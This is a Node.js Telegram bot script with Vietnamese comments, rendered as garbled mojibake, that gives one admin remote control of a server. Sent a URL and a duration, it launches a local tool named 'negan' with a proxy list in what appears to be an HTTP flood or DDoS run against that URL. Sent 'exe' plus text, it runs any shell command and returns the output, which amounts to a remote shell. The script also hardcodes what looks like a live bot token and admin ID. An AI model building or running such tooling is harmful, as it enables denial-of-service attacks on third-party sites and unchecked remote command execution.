const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');

// C·∫•u h√¨nh bot
const token = '7771059100:AAFjgShX0sLTPXmH7jqxTcuTFj6jIB2xeII'; // Thay th·∫ø b·∫±ng token c·ªßa b·∫°n
const bot = new TelegramBot(token, { polling: true });
const adminId = 7371969470; // Thay th·∫ø b·∫±ng ID c·ªßa admin

// H√†m l·∫•y th√¥ng s·ªë CPU v√† RAM
const getSystemStats = () => {
    const totalMemory = os.totalmem();
    const freeMemory = os.freemem();
    const usedMemory = totalMemory - freeMemory;
    const memoryUsagePercent = ((usedMemory / totalMemory) * 100).toFixed(2);
    const cpuUsagePercent = (os.cpus().reduce((acc, cpu) => {
        const total = Object.values(cpu.times).reduce((a, b) => a + b, 0);
        const idle = cpu.times.idle;
        return acc + (100 - (idle / total) * 100);
    }, 0) / os.cpus().length).toFixed(2);
    return {
        memoryUsagePercent,
        cpuUsagePercent,
        totalMemory: (totalMemory / 1024 / 1024 / 1024).toFixed(0),
        freeMemory: (freeMemory / 1024 / 1024 / 1024).toFixed(0)
    };
};

// G·ª≠i th√¥ng s·ªë CPU v√† RAM m·ªói 14 gi√¢y
setInterval(() => {
    const stats = getSystemStats();
    const cpuFreePercent = (100 - parseFloat(stats.cpuUsagePercent)).toFixed(2);
    bot.sendMessage(
        adminId,
        `Th√¥ng s·ªë ƒë√£ s·ª≠ d·ª•ng: üöÄ\n- CPU ƒë√£ s·ª≠ d·ª•ng: ${stats.cpuUsagePercent}%\n- RAM ƒë√£ s·ª≠ d·ª•ng: ${stats.memoryUsagePercent}%\n\nTh√¥ng s·ªë c√≤n tr·ªëng: ‚ù§Ô∏è\n- CPU c√≤n tr·ªëng: ${cpuFreePercent}%\n- RAM c√≤n tr·ªëng: ${stats.freeMemory}GB\n- T·ªïng RAM: ${stats.totalMemory}GB`
    );
}, 14000);

// H√†m chia nh·ªè tin nh·∫Øn v√† x·ª≠ l√Ω l·ªói Markdown
const sendLongMessage = async (chatId, text) => {
    const maxLength = 4096;
    const escapeMarkdown = (str) => str.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&'); // Escape k√Ω t·ª± Markdown
    for (let i = 0; i < text.length; i += maxLength) {
        const chunk = escapeMarkdown(text.substring(i, i + maxLength));
        try {
            await bot.sendMessage(chatId, chunk, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error(`[ERROR] G·ª≠i tin nh·∫Øn th·∫•t b·∫°i: ${error.message}`);
            await bot.sendMessage(chatId, `üö´ L·ªói khi g·ª≠i k·∫øt qu·∫£: ${error.message}`);
        }
    }
};

// Bi·∫øn ƒë·ªÉ ki·ªÉm tra bot ƒë√£ kh·ªüi ƒë·ªông xong ch∆∞a
let isBotReady = false;

// X·ª≠ l√Ω l·ªánh t·ª´ admin
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // Ch·ªâ admin m·ªõi c√≥ quy·ªÅn th·ª±c hi·ªán l·ªánh
    if (chatId !== adminId) {
        return bot.sendMessage(chatId, 'B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán l·ªánh n√†y.');
    }

    // Ch·ªâ x·ª≠ l√Ω l·ªánh n·∫øu bot ƒë√£ kh·ªüi ƒë·ªông xong
    if (!isBotReady) {
        return bot.sendMessage(chatId, 'Bot ƒëang kh·ªüi ƒë·ªông, vui l√≤ng ch·ªù...');
    }

    // X·ª≠ l√Ω l·ªánh d·∫°ng "https://muahack.com 10"
    if (text.startsWith('http') || text.startsWith('htttp') || text.startsWith('htttps')) {
        const correctedText = text.replace(/^ht+tps?:\/\//, 'https://');
        const parts = correctedText.split(' ');
        if (parts.length !== 2 || isNaN(parts[1])) {
            return bot.sendMessage(chatId, 'Sai ƒë·ªãnh d·∫°ng! Nh·∫≠p theo: <URL> <time>.');
        }
        const [host, time] = parts;
        const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
        console.log(`[DEBUG] L·ªánh ƒë∆∞·ª£c th·ª±c thi: ${command}`);
        await bot.sendMessage(chatId, `üöÄ ƒêang th·ª±c thi l·ªánh: \`${command}\``);
        const child = exec(command);
        let output = '';
        child.stdout.on('data', (data) => {
            output += data.toString();
            console.log(`[DEBUG] stdout: ${data.toString()}`);
        });
        child.stderr.on('data', (data) => {
            output += data.toString();
            console.log(`[DEBUG] stderr: ${data.toString()}`);
        });
        child.on('close', () => {
            console.log(`[DEBUG] L·ªánh ƒë√£ k·∫øt th√∫c v·ªõi k·∫øt qu·∫£: ${output}`);
            sendLongMessage(chatId, `üöÄ K·∫øt qu·∫£ l·ªánh: \`${command}\`\n\`\`\`\n${output}\n\`\`\``);
        });
        return;
    }

    // X·ª≠ l√Ω l·ªánh b·∫Øt ƒë·∫ßu b·∫±ng "exe"
    if (text.startsWith('exe ')) {
        const command = text.slice(4).trim();
        if (!command) {
            return bot.sendMessage(chatId, 'L·ªánh kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng. V√≠ d·ª•: "exe ls"');
        }
        console.log(`[DEBUG] L·ªánh ƒë∆∞·ª£c th·ª±c thi: ${command}`);
        await bot.sendMessage(chatId, `üöÄ ƒêang th·ª±c thi l·ªánh: \`${command}\``);
        const child = exec(command === 'pkill .' ? 'pkill -f -9 start.sh prxscan.py negan.js bot.js' : command);
        let output = '';
        child.stdout.on('data', (data) => {
            output += data.toString();
            console.log(`[DEBUG] stdout: ${data.toString()}`);
        });
        child.stderr.on('data', (data) => {
            output += data.toString();
            console.log(`[DEBUG] stderr: ${data.toString()}`);
        });
        child.on('close', () => {
            console.log(`[DEBUG] L·ªánh ƒë√£ k·∫øt th√∫c v·ªõi k·∫øt qu·∫£: ${output}`);
            sendLongMessage(chatId, `üöÄ K·∫øt qu·∫£ l·ªánh: \`${command}\`\n\`\`\`\n${output}\n\`\`\``);
        });
        return;
    }

    // N·∫øu l·ªánh kh√¥ng h·ª£p l·ªá
    bot.sendMessage(chatId, 'L·ªánh kh√¥ng h·ª£p l·ªá. Vui l√≤ng b·∫Øt ƒë·∫ßu l·ªánh v·ªõi "exe" ho·∫∑c nh·∫≠p URL v√† th·ªùi gian.');
});

// X·ª≠ l√Ω l·ªói polling
bot.on('polling_error', (error) => {
    console.error(`[POLLING ERROR] ${error.code}: ${error.message}`);
    setTimeout(() => bot.startPolling(), 5000); // Kh·ªüi ƒë·ªông l·∫°i polling sau 5 gi√¢y
});

// ƒê√°nh d·∫•u bot ƒë√£ kh·ªüi ƒë·ªông xong v√† th√¥ng b√°o s·∫µn s√†ng nh·∫≠n l·ªánh
bot.on('polling_start', () => {
    isBotReady = true;
    bot.sendMessage(adminId, 'ü§ñ Bot ƒë√£ s·∫µn s√†ng nh·∫≠n l·ªánh.');
    console.log('[DEBUG] Bot ƒë√£ kh·ªüi ƒë·ªông xong v√† s·∫µn s√†ng nh·∫≠n l·ªánh.');
});
